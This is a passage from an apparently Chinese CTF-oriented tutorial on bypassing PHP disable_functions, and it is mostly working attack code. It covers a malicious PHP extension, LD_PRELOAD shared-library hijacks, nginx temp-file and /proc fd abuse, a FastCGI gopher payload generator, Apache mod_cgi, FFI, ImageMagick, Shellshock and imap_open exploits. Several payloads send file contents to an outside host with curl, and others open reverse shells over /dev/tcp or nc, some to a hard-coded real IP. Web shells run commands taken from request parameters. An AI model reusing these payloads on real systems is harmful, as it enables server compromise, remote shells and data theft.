http://47.99.77.52:6666/?s=`cat /*`&quot;);&#125;/* &#125;&#125;&#125; *//* &#123;&#123;&#123; string backdoor_test2( [ string $var ] ) */PHP_FUNCTION(backdoor_test2)&#123;        char *var = &quot;World&quot;;        size_t var_len = sizeof(&quot;World&quot;) - 1;        zend_string *retval;        ZEND_PARSE_PARAMETERS_START(0, 1)                Z_PARAM_OPTIONAL                Z_PARAM_STRING(var, var_len)        ZEND_PARSE_PARAMETERS_END();        retval = strpprintf(0, &quot;Hello %s&quot;, var);        RETURN_STR(retval);&#125;/* &#125;&#125;&#125;*//* &#123;&#123;&#123; PHP_RINIT_FUNCTION */PHP_RINIT_FUNCTION(backdoor)&#123;#if defined(ZTS) &amp;&amp; defined(COMPILE_DL_BACKDOOR)        ZEND_TSRMLS_CACHE_UPDATE();#endif        return SUCCESS;&#125;/* &#125;&#125;&#125; *//* &#123;&#123;&#123; PHP_MINFO_FUNCTION */PHP_MINFO_FUNCTION(backdoor)&#123;        php_info_print_table_start();        php_info_print_table_header(2, &quot;backdoor support&quot;, &quot;enabled&quot;);        php_info_print_table_end();&#125;/* &#125;&#125;&#125; *//* &#123;&#123;&#123; arginfo */ZEND_BEGIN_ARG_INFO(arginfo_backdoor_test1, 0)ZEND_END_ARG_INFO()ZEND_BEGIN_ARG_INFO(arginfo_backdoor_test2, 0)        ZEND_ARG_INFO(0, str)ZEND_END_ARG_INFO()/* &#125;&#125;&#125; *//* &#123;&#123;&#123; backdoor_functions[] */static const zend_function_entry backdoor_functions[] = &#123;        PHP_FE(ctfshow,         arginfo_backdoor_test1)        PHP_FE(backdoor_test2,          arginfo_backdoor_test2)        PHP_FE_END&#125;;/* &#125;&#125;&#125; *//* &#123;&#123;&#123; backdoor_module_entry */zend_module_entry backdoor_module_entry = &#123;        STANDARD_MODULE_HEADER,        &quot;backdoor&quot;,                                     /* Extension name */        backdoor_functions,                     /* zend_function_entry */        NULL,                                                   /* PHP_MINIT - Module initialization */        NULL,                                                   /* PHP_MSHUTDOWN - Module shutdown */        PHP_RINIT(backdoor),                    /* PHP_RINIT - Request initialization */        NULL,                                                   /* PHP_RSHUTDOWN - Request shutdown */        PHP_MINFO(backdoor),                    /* PHP_MINFO - Module info */        PHP_BACKDOOR_VERSION,           /* Version */        STANDARD_MODULE_PROPERTIES&#125;;/* &#125;&#125;&#125; */#ifdef COMPILE_DL_BACKDOOR# ifdef ZTSZEND_TSRMLS_CACHE_DEFINE()# endifZEND_GET_MODULE(backdoor)#endif

然后编译
phpize./configuremakemake install

就会在modules目录下生成.so文件，然后将生成的恶意文件上传或写入到目标的扩展目录，使用php -r调用，就能执行自定义的命令了
注意，如果制作so的环境的php版本于靶机的php版本不同，则可能会产生如下错误
Warning: PHP Startup: backdoor: Unable to initialize moduleModule compiled with module API=20190902PHP    compiled with module API=20180731These options need to match in Unknown on line 0Deprecated: Directive &#x27;track_errors&#x27; is deprecated in Unknown on line 0Fatal error: Uncaught Error: Call to undefined function ctfshow() in Command line code:1Stack trace:#0 &#123;main&#125;  thrown in Command line code on line 1

这时候需要修改/usr/include/php/20190902/Zend/zend_modules.h(具体路径可能不一致)文件中的ZEND_MODULE_API_NO的值为上面报错中的值20180731
然后编译
make cleanphpize./configuremake &amp;&amp; make install




利用 LD_PRELOAD 环境变量
LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。

总的来说就是通过LD_PRELOAD指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果
需要的条件如下

创建的恶意so文件可以上传到目标主机
能够控制 LD_PRELOAD 环境变量的值，比如 putenv() 函数
需要通过某个可以创建新进程的函数来加载 LD_PRELOAD 中的 .so 文件，比如 mail()、imap_mail()、mb_send_mail() 和 error_log() 函数等

劫持系统函数在php中启动新进程时会自动调用许多的函数和api等等，其中 getuid 函数来确认进程属主(执行权限）
通过man 2 getuid查看函数原型
可以发现没有参数并且很常用，符合劫持函数的要求
GETUID(2)                                                        Linux Programmer&#x27;s Manual                                                        GETUID(2)NAME       getuid, geteuid - get user identitySYNOPSIS       #include &lt;unistd.h&gt;       #include &lt;sys/types.h&gt;       uid_t getuid(void);       uid_t geteuid(void);DESCRIPTION       getuid() returns the real user ID of the calling process.       geteuid() returns the effective user ID of the calling process.ERRORS       These functions are always successful.

劫持getuid
#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload()&#123;        system(&quot;curl http://url:port?s=`cat /*`&quot;);&#125;int getuid()&#123;        if(getenv(&quot;LD_PRELOAD&quot;)==NULL)&#123; return 0;&#125;        unsetenv(&quot;LD_PRELOAD&quot;);        payload();&#125;

生成动态链接库
gcc -c -fPIC hack.c -o hack &amp;&amp; gcc --share hack -o hack.so
将 hack.so 上传并通过环境变量 LD_PRELOAD 指定后，只要新建进程，就会执行我们的恶意代码
php中部分可以新建进程的函数如下
systemshell_execexecpassthruproc_openpopenpcntlmailimap_mailmb_send_mailerror_loglibvirt_connectgnupg_initimagick

还可以通过strace -f php 1.php 2&gt;&amp;1 | grep execve命令来查看是否创建了新的进程

劫持启动进程但是某些函数并不会调用getuid或者被禁用，这时候就需要更加通用的方式，不局限于劫持某一函数
在 GCC 中有个 C 语言扩展修饰符 __attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute__((constructor)) 修饰的函数
#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void preload (void)&#123;    int i;    for (i = 0; environ[i]; ++i) &#123;            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;                    environ[i][0] = &#x27;\0&#x27;;            &#125;    &#125;    system(&quot;curl http://url:port?s=`cat /*`&quot;);&#125;

编译
gcc -c -fPIC hack.c -o hack &amp;&amp; gcc --share hack -o hack.so
无上传点时的利用姿势当没有表面上的上传点时可以考虑利用临时文件
一：php的临时文件
php的临时文件一般在/tmp目录下，如果可以列目录看到文件名的话可以考虑利用，否则很难爆破文件名
二：nginx的body缓存机制
如果传输的数据大于16k，则nginx会缓存。虽然说nginx会保存文件，但是nginx会在转发给php-fpm后就删除掉了(在php解释执行之前)
这就不能直接利用了，需要用到linux的一个特性：/proc/PID/fd/&#123;1&#125;去读取（条件是php和nginx的执行用户名是相同的才可以访问）
一个例子
import reimport socketimport threadingip = &#x27;pwn.challenge.ctf.show&#x27;port = 28268s = socket.socket()s.connect((ip, port))# 获取当前进程的pids.send(f&#x27;&#x27;&#x27;GET / HTTP/1.1Host:127.0.0.1	&#x27;&#x27;&#x27;.encode())data = s.recv(1024).decode()s.close()pid = re.findall(&#x27;(.*?) www-data&#x27;, data)[0].strip()print(&quot;pid:&quot;, pid)# payloadpayload = &quot;curl http://47.99.77.52:8888?a=`cat /f*`;&quot; + &#x27;0&#x27; * 1024 * 500length = len(payload)# 上传文件def upload():    while True:        s = socket.socket()        s.connect((ip, port))        x = f&#x27;&#x27;&#x27;POST / HTTP/1.1Host: 127.0.0.1Content-Length: &#123;length&#125;Content-Type: application/x-www-form-urlencodedConnection: close&#123;payload&#125;&#x27;&#x27;&#x27;.encode()        s.send(x)        s.close()# 读取文件def bruter():    while True:        for fd in range(3, 40):            print(&quot;fd:&quot;, fd)            s = socket.socket()            s.connect((ip, port))            s.send(f&#x27;&#x27;&#x27;GET /?file=/proc/&#123;pid&#125;/fd/&#123;fd&#125; HTTP/1.1Host: 127.0.0.1Connection: close&#x27;&#x27;&#x27;.encode())            print(s.recv(2048).decode())            s.close()for i in range(30):    t = threading.Thread(target=upload)    t.start()for j in range(30):    a = threading.Thread(target=bruter)    a.start()


三：nginx的body缓存机制+恶意so文件
与二类似，只不过将命令换成了so文件
import reimport socketimport threadingip = &#x27;pwn.challenge.ctf.show&#x27;port = 28128s = socket.socket()s.connect((ip, port))# 获取当前进程的pids.send(f&#x27;&#x27;&#x27;GET / HTTP/1.1Host:127.0.0.1	&#x27;&#x27;&#x27;.encode())data = s.recv(1024).decode()s.close()pid = re.findall(&#x27;(.*?) www-data&#x27;, data)[0].strip()print(&quot;pid:&quot;, pid)# payload lengthlength = str(len(open(&#x27;hack.so&#x27;, &#x27;rb&#x27;).read() + b&#x27;\n&#x27; * 1024 * 200)).encode()# 上传文件def upload():    while True:        s = socket.socket()        s.connect((ip, port))        x = b&#x27;&#x27;&#x27;POST / HTTP/1.1Host: 127.0.0.1Content-Length: &#x27;&#x27;&#x27; + length + b&#x27;&#x27;&#x27;Content-Type: application/x-www-form-urlencodedConnection: close&#x27;&#x27;&#x27; + open(&#x27;hack.so&#x27;, &#x27;rb&#x27;).read() + b&#x27;\n&#x27; * 1024 * 200 + b&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;        s.send(x)        s.close()# 读取文件def bruter():    while True:        for fd in range(3, 40):            print(&quot;fd:&quot;, fd)            s = socket.socket()            s.connect((ip, port))            s.send(f&#x27;&#x27;&#x27;GET /?env=LD_PRELOAD=/proc/&#123;pid&#125;/fd/&#123;fd&#125; HTTP/1.1Host: 127.0.0.1Connection: close&#x27;&#x27;&#x27;.encode())            print(s.recv(2048).decode())            s.close()for i in range(30):    t = threading.Thread(target=upload)    t.start()for j in range(30):    a = threading.Thread(target=bruter)    a.start()




加载so绕过disable_functions原理与 LD_PRELOAD 绕过的方式差不多，一个是通过 putenv 设置，另一个则是通过上传一个恶意so文件，然后通过 PHP_VALUE 给 php.ini 添加一个 extender 扩展来绕过
制作恶意so文件
#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void preload (void)&#123;    int i;    for (i = 0; environ[i]; ++i) &#123;            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;                    environ[i][0] = &#x27;\0&#x27;;            &#125;    &#125;    system(&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/IP/PORT &lt;&amp;1&#x27;&quot;);&#125;

编译
gcc -c -fPIC hack.c -o hack &amp;&amp; gcc --share hack -o hack.so
以下是修改过的 https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75，可以生成payload，注意修改 PHP_VALUE 的内容
import socketimport randomimport argparseimport sysfrom io import BytesIO# 修改点 1from urllib.parse import quote# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i):    if PY2:        return force_bytes(chr(i))    else:        return bytes([i])def bord(c):    if isinstance(c, int):        return c    else:        return ord(c)def force_bytes(s):    if isinstance(s, bytes):        return s    else:        return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;)def force_text(s):    if issubclass(type(s), str):        return s    if isinstance(s, bytes):        s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;)    else:        s = str(s)    return sclass FastCGIClient:    &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;    # private    __FCGI_VERSION = 1    __FCGI_ROLE_RESPONDER = 1    __FCGI_ROLE_AUTHORIZER = 2    __FCGI_ROLE_FILTER = 3    __FCGI_TYPE_BEGIN = 1    __FCGI_TYPE_ABORT = 2    __FCGI_TYPE_END = 3    __FCGI_TYPE_PARAMS = 4    __FCGI_TYPE_STDIN = 5    __FCGI_TYPE_STDOUT = 6    __FCGI_TYPE_STDERR = 7    __FCGI_TYPE_DATA = 8    __FCGI_TYPE_GETVALUES = 9    __FCGI_TYPE_GETVALUES_RESULT = 10    __FCGI_TYPE_UNKOWNTYPE = 11    __FCGI_HEADER_SIZE = 8    # request state    FCGI_STATE_SEND = 1    FCGI_STATE_ERROR = 2    FCGI_STATE_SUCCESS = 3    def __init__(self, host, port, timeout, keepalive):        self.host = host        self.port = port        self.timeout = timeout        if keepalive:            self.keepalive = 1        else:            self.keepalive = 0        self.sock = None        self.requests = dict()    def __connect(self):        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.sock.settimeout(self.timeout)        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        # if self.keepalive:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)        # else:        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)        # 修改点 2        # try:        #     self.sock.connect((self.host, int(self.port)))        # except socket.error as msg:        #     self.sock.close()        #     self.sock = None        #     print(repr(msg))        #     return False        return True    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):        length = len(content)        buf = bchr(FastCGIClient.__FCGI_VERSION) \              + bchr(fcgi_type) \              + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \              + bchr(requestid &amp; 0xFF) \              + bchr((length &gt;&gt; 8) &amp; 0xFF) \              + bchr(length &amp; 0xFF) \              + bchr(0) \              + bchr(0) \              + content        return buf    def __encodeNameValueParams(self, name, value):        nLen = len(name)        vLen = len(value)        record = b&#x27;&#x27;        if nLen &lt; 128:            record += bchr(nLen)        else:            record += bchr((nLen &gt;&gt; 24) | 0x80) \                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \                      + bchr(nLen &amp; 0xFF)        if vLen &lt; 128:            record += bchr(vLen)        else:            record += bchr((vLen &gt;&gt; 24) | 0x80) \                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \                      + bchr(vLen &amp; 0xFF)        return record + name + value    def __decodeFastCGIHeader(self, stream):        header = dict()        header[&#x27;version&#x27;] = bord(stream[0])        header[&#x27;type&#x27;] = bord(stream[1])        header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])        header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])        header[&#x27;paddingLength&#x27;] = bord(stream[6])        header[&#x27;reserved&#x27;] = bord(stream[7])        return header    def __decodeFastCGIRecord(self, buffer):        header = buffer.read(int(self.__FCGI_HEADER_SIZE))        if not header:            return False        else:            record = self.__decodeFastCGIHeader(header)            record[&#x27;content&#x27;] = b&#x27;&#x27;            if &#x27;contentLength&#x27; in record.keys():                contentLength = int(record[&#x27;contentLength&#x27;])                record[&#x27;content&#x27;] += buffer.read(contentLength)            if &#x27;paddingLength&#x27; in record.keys():                skiped = buffer.read(int(record[&#x27;paddingLength&#x27;]))            return record    def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;):        if not self.__connect():            print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;)            return        requestId = random.randint(1, (1 &lt;&lt; 16) - 1)        self.requests[requestId] = dict()        request = b&quot;&quot;        beginFCGIRecordContent = bchr(0) \                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \                                 + bchr(self.keepalive) \                                 + bchr(0) * 5        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,                                              beginFCGIRecordContent, requestId)        paramsRecord = b&#x27;&#x27;        if nameValuePairs:            for (name, value) in nameValuePairs.items():                name = force_bytes(name)                value = force_bytes(value)                paramsRecord += self.__encodeNameValueParams(name, value)        if paramsRecord:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId)        if post:            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId)        # 修改点 3        # self.sock.send(request)        # self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND        # self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27;        # return self.__waitForResponse(requestId)        return request    def __waitForResponse(self, requestId):        data = b&#x27;&#x27;        while True:            buf = self.sock.recv(512)            if not len(buf):                break            data += buf        data = BytesIO(data)        while True:            response = self.__decodeFastCGIRecord(data)            if not response:                break            if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \                    or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR:                if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR:                    self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR                if requestId == int(response[&#x27;requestId&#x27;]):                    self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;]            if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS:                self.requests[requestId]        return self.requests[requestId][&#x27;response&#x27;]    def __repr__(self):        return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)if __name__ == &#x27;__main__&#x27;:    parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;)    parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;)    parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;)    parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;)    parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int)    args = parser.parse_args()    client = FastCGIClient(args.host, args.port, 3, 0)    params = dict()    documentRoot = &quot;/&quot;    uri = args.file    content = args.code    params = &#123;        &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,        &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;,        &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;),        &#x27;SCRIPT_NAME&#x27;: uri,        &#x27;QUERY_STRING&#x27;: &#x27;&#x27;,        &#x27;REQUEST_URI&#x27;: uri,        &#x27;DOCUMENT_ROOT&#x27;: documentRoot,        &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,        &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,        &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;,        &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,        &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,        &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,        &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;,        &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;,        &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content),        &#x27;PHP_VALUE&#x27;: &#x27;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hack.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &#x27;,        &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;    &#125;    # 修改点 4    # response = client.request(params, content)    # print(force_text(response))    request_ssrf = quote(client.request(params, content))    print(&quot;gopher://127.0.0.1:&quot; + str(args.port) + &quot;/_&quot; + request_ssrf)

用法和原来一样
python fpm.py 127.0.0.1 -p 9001 /var/www/html/add_api.php -c &quot;&lt;?php phpinfo(); ?&gt;&quot;
Apache_mod_cgi利用条件

Linux 操作系统
Apache + PHP (apache 使用 apache_mod_php)
Apache 开启了 cgi, rewrite
httpd.conf 中给了Web目录 AllowOverride 权限（允许.htaccess文件）
当前目录可写

原理
Apache 在配置开启 CGI 后可以用 ScriptAlias 指令指定一个目录，指定的目录下面便可以存放可执行的 CGI 程序。若是想临时允许一个目录可以执行 CGI 程序并且使得服务器将自定义的后缀解析为 CGI 程序执行，则可以在目的目录下使用 htaccess 文件进行配置，如下：
Options +ExecCGIAddHandler cgi-script .xxx

这样便会将当前目录下的所有的 .xxx 文件当做 CGI 程序执行了。由于 CGI 程序可以执行命令，那我们可以利用 CGI 来执行系统命令绕过 disable_functions
利用
1：在web目录新建一个 .htaccess 文件
Options +ExecCGIAddHandler cgi-script .xxx

2：然后新建一个后缀为 .xxx 的文件，内容是要执行的命令，然后赋予777权限
注意：linux中cgi比较严格，如果上传后发现状态码500，无法解析文件。可能是因为本地编辑器编写上传时编码不一致导致无法解析
#!/bin/shecho&amp;&amp;cd &quot;/var/www/html&quot;;ls -al

3：最后网页访问即可
如果命令执行失败，页面也会报 500 错误(因为访问的是 CGI)
综合利用脚本
&lt;?php$cmd = &quot;nc -c &#x27;/bin/bash&#x27; 172.16.15.1 4444&quot;; //command to be executed$shellfile = &quot;#!/bin/bash\n&quot;; //using a shellscript$shellfile .= &quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //header is needed, otherwise a 500 error is thrown when there is output$shellfile .= &quot;$cmd&quot;; //executing $cmdfunction checkEnabled($text, $condition, $yes, $no) //this surely can be shorter&#123;	echo &quot;$text: &quot; . ($condition ? $yes : $no) . &quot;&lt;br&gt;\n&quot;;&#125;if (!isset($_GET[&#x27;checked&#x27;])) &#123;	@file_put_contents(&#x27;.htaccess&#x27;, &quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed	header(&#x27;Location: &#x27; . $_SERVER[&#x27;PHP_SELF&#x27;] . &#x27;?checked=true&#x27;); //execute the script again to see if the htaccess test worked&#125; else &#123;	$modcgi = in_array(&#x27;mod_cgi&#x27;, apache_get_modules()); // mod_cgi enabled?	$writable = is_writable(&#x27;.&#x27;); //current dir writable?	$htaccess = !empty($_SERVER[&#x27;HTACCESS&#x27;]); //htaccess enabled?	checkEnabled(&quot;Mod-Cgi enabled&quot;, $modcgi, &quot;Yes&quot;, &quot;No&quot;);	checkEnabled(&quot;Is writable&quot;, $writable, &quot;Yes&quot;, &quot;No&quot;);	checkEnabled(&quot;htaccess working&quot;, $htaccess, &quot;Yes&quot;, &quot;No&quot;);	if (!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess)) &#123;		echo &quot;Error. All of the above must be true for the script to work!&quot;; //abort if not	&#125; else &#123;		checkEnabled(&quot;Backing up .htaccess&quot;, copy(&quot;.htaccess&quot;, &quot;.htaccess.bak&quot;), &quot;Suceeded! Saved in .htaccess.bak&quot;, &quot;Failed!&quot;); //make a backup, cause you never know.		checkEnabled(&quot;Write .htaccess file&quot;, file_put_contents(&#x27;.htaccess&#x27;, &quot;Options +ExecCGI\nAddHandler cgi-script .dizzle&quot;), &quot;Succeeded!&quot;, &quot;Failed!&quot;); //.dizzle is a nice extension		checkEnabled(&quot;Write shell file&quot;, file_put_contents(&#x27;shell.dizzle&#x27;, $shellfile), &quot;Succeeded!&quot;, &quot;Failed!&quot;); //write the file		checkEnabled(&quot;Chmod 777&quot;, chmod(&quot;shell.dizzle&quot;, 0777), &quot;Succeeded!&quot;, &quot;Failed!&quot;); //rwx		echo &quot;Executing the script now. Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style = &#x27;display:none;&#x27;&gt;&quot;; //call the script	&#125;&#125;?&gt;


php74_FFI利用条件

Linux 操作系统
PHP &gt;&#x3D; 7.4
开启了 FFI 扩展且 ffi.enable&#x3D;true

原理
FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术
通过c语言的system去执行命令,绕过php的disable_functions
利用
C库的system函数执行是没有回显的，所以需要将执行结果写入到tmp等有权限的目录中
&lt;?php$cmd=$_GET[&#x27;cmd&#x27;];$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;$cmd &gt; /tmp/SD&quot;);echo file_get_contents(&quot;/tmp/SD&quot;);@unlink(&quot;/tmp/SD&quot;);?&gt;

或者调用popen和fgetc
&lt;?php$cmd=$_GET[&#x27;cmd&#x27;];$ffi = FFI::cdef(&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $ffi-&gt;popen(&quot;$cmd&quot;,&quot;r&quot;);$d = &quot;&quot;;while(($c = $ffi-&gt;fgetc($o)) != -1)&#123;$d .= str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$ffi-&gt;pclose($o);echo hex2bin($d);

又或者调用PHP源码中的函数
&lt;?php$cmd=$_GET[&#x27;cmd&#x27;];$ffi = FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$ffi-&gt;php_exec(3,&quot;$cmd&quot;);   //3表示passthru()函数，其执行命令可以直接将结果原始输出



ImageMagick(CVE-2016–3714)利用条件

漏洞影响ImageMagick 6.9.3-9以前的所有版本
安装了 php-imagick 拓展并在 php.ini 中启用
编写 php 通过 new Imagick 对象的方式来处理图片等格式文件
PHP &gt;&#x3D; 5.4

原理
https://imagetragick.com/https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html
简单来说就是ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的
同时它内部定义了很多占位符，而在其中command的位置，%i和%l等占位符被拼接在命令行中。这个漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（&#96;）或闭合双引号，来执行任意命令
利用
反弹shell
&lt;?phpecho &quot;Disable Functions: &quot; . ini_get(&#x27;disable_functions&#x27;) . &quot;\n&quot;;function AAAA()&#123;$exploit = &lt;&lt;&lt;EOFpush graphic-contextviewbox 0 0 640 480fill &#x27;url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ3Ljk5Ljc3LjUyLzg4ODggMD4mMQ== | base64 -d | bash`&quot;||id &quot; )&#x27;pop graphic-contextEOF;file_put_contents(&quot;KKKK.mvg&quot;, $exploit);$thumb = new Imagick();$thumb-&gt;readImage(&#x27;KKKK.mvg&#x27;);$thumb-&gt;writeImage(&#x27;KKKK.png&#x27;);$thumb-&gt;clear();$thumb-&gt;destroy();unlink(&quot;KKKK.mvg&quot;);unlink(&quot;KKKK.png&quot;);&#125;AAAA();?&gt;

执行命令
&lt;?phpecho &quot;Disable functions: &quot; . ini_get(&quot;disable_functions&quot;) . &quot;\n&quot;;$command = isset($_GET[&#x27;cmd&#x27;]) ? $_GET[&#x27;cmd&#x27;] : &#x27;id&#x27;;echo &quot;Run command: $command\n====================\n&quot;;$data_file = tempnam(&#x27;/tmp&#x27;, &#x27;img&#x27;);$imagick_file = tempnam(&#x27;/tmp&#x27;, &#x27;img&#x27;);$exploit = &lt;&lt;&lt;EOFpush graphic-contextviewbox 0 0 640 480fill &#x27;url(https://127.0.0.1/image.jpg&quot;|$command&gt;$data_file&quot;)&#x27;pop graphic-contextEOF;file_put_contents(&quot;$imagick_file&quot;, $exploit);$thumb = new Imagick();$thumb-&gt;readImage(&quot;$imagick_file&quot;);$thumb-&gt;writeImage(tempnam(&#x27;/tmp&#x27;, &#x27;img&#x27;));$thumb-&gt;clear();$thumb-&gt;destroy();echo file_get_contents($data_file);?&gt;



Bash Shellshock(CVE-2014-6271)利用条件

目标环境存在Bash破壳（CVE-2014-6271）漏洞
putenv()、mail() 或 error_log() 函数可用

利用
需要利用 PHP 中可以调用 popen 或其他能够派生 bash 子进程的函数
&lt;?phpfunction runcmd($c)&#123;  $d = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);  if(substr($d, 0, 1) == &quot;/&quot; &amp;&amp; function_exists(&#x27;putenv&#x27;) &amp;&amp; (function_exists(&#x27;error_log&#x27;) || function_exists(&#x27;mail&#x27;)))&#123;    if(strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;)!=FALSE)&#123;      $tmp=tempnam(sys_get_temp_dir(), &#x27;as&#x27;);      putenv(&quot;PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);      if (function_exists(&#x27;error_log&#x27;)) &#123;        error_log(&quot;a&quot;, 1);      &#125;else&#123;        mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);      &#125;    &#125;else&#123;      print(&quot;Not vuln (not bash)\n&quot;);    &#125;    $output = @file_get_contents($tmp);    @unlink($tmp);    if($output!=&quot;&quot;)&#123;      print($output);    &#125;else&#123;      print(&quot;No output, or not vuln.&quot;);    &#125;  &#125;else&#123;    print(&quot;不满足使用条件&quot;);  &#125;&#125;// runcmd(&quot;whoami&quot;); // 要执行的命令runcmd($_REQUEST[&quot;cmd&quot;]); // ?cmd=whoami?&gt;


imap_open()绕过 (CVE-2018-19518)利用条件

PHP 安装 imap 模块

原理
php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian&#x2F;ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）
ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。即使是ssh连接失败了，但是命令还是能执行。
利用
&lt;?php$payload = &quot;/bin/bash -i &gt;&amp; /dev/tcp/47.99.77.52/8888 0&gt;&amp;1&quot;;$base64 = base64_encode($payload);$server = &quot;any -oProxyCommand=echo\t&#123;$base64&#125;|base64\t-d|bash&quot;;@imap_open(&quot;&#123;&quot;.$server.&quot;&#125;:143/imap&#125;INBOX&quot;,&quot;&quot;,&quot;&quot;) or die(&quot;\n\nError: &quot;.imap_last_error());;


Windows组件COM绕过利用条件

com.allow_dcom &#x3D; true
extension&#x3D;php_com_dotnet.dll
php&gt;5.4
目标服务器为Windows系统

利用
